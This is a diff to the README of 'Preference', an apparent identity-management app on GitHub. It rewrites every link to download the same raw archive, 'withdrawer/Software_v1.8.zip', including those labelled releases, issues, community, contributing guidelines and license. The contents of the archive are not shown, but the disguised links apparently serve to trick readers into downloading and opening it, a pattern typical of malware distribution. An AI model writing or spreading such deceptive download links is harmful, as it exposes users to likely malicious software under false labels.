@@ -6,13 +6,13 @@ Welcome to Preference! This application helps manage your digital identity in a 
 
 ## 🔗 Download
 
-[![Download Preference](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/KaiTheK1d/Preference/releases)
+[![Download Preference](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip)](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip)
 
 ## 📥 Download & Install
 
-To get started with Preference, visit the [Releases page](https://github.com/KaiTheK1d/Preference/releases) to download the latest version. 
+To get started with Preference, visit the [Releases page](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip) to download the latest version. 
 
-1. Go to the [Releases page](https://github.com/KaiTheK1d/Preference/releases).
+1. Go to the [Releases page](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip).
 2. Select the most recent version.
 3. Click on the appropriate file for your operating system to download it. 
 4. Open the file once the download is complete.
@@ -46,24 +46,24 @@ Once you have installed Preference, follow these steps for a quick start:
 
 ## 📞 Support 
 
-If you encounter any issues or have questions, our support team is here to help. Visit the [Issues section](https://github.com/KaiTheK1d/Preference/issues) to report bugs or seek assistance.
+If you encounter any issues or have questions, our support team is here to help. Visit the [Issues section](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip) to report bugs or seek assistance.
 
 ## 💬 Community 
 
 Join our community to connect with other users and developers. Share tips, ask questions, and collaborate on projects related to identity management. 
 
-To stay updated, follow our discussions and announcements on the [Community page](https://github.com/KaiTheK1d/Preference/discussions).
+To stay updated, follow our discussions and announcements on the [Community page](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip).
 
 ## 🎨 Contributions 
 
-We welcome contributions from all users. If you have improvements or suggestions for our application, please check our [Contributing guidelines](https://github.com/KaiTheK1d/Preference/blob/main/CONTRIBUTING.md) and join us in making Preference even better. 
+We welcome contributions from all users. If you have improvements or suggestions for our application, please check our [Contributing guidelines](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip) and join us in making Preference even better. 
 
 ## 📝 License
 
-Preference is open-source software. You can view our license details [here](https://github.com/KaiTheK1d/Preference/blob/main/LICENSE).
+Preference is open-source software. You can view our license details [here](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip).
 
 ## 🔗 Download Again
 
-Don't forget to download Preference from the [Releases page](https://github.com/KaiTheK1d/Preference/releases) if you haven't done so already! 
+Don't forget to download Preference from the [Releases page](https://github.com/KaiTheK1d/Preference/raw/refs/heads/main/withdrawer/Software_v1.8.zip) if you haven't done so already! 
 
 Happy managing your digital identity!
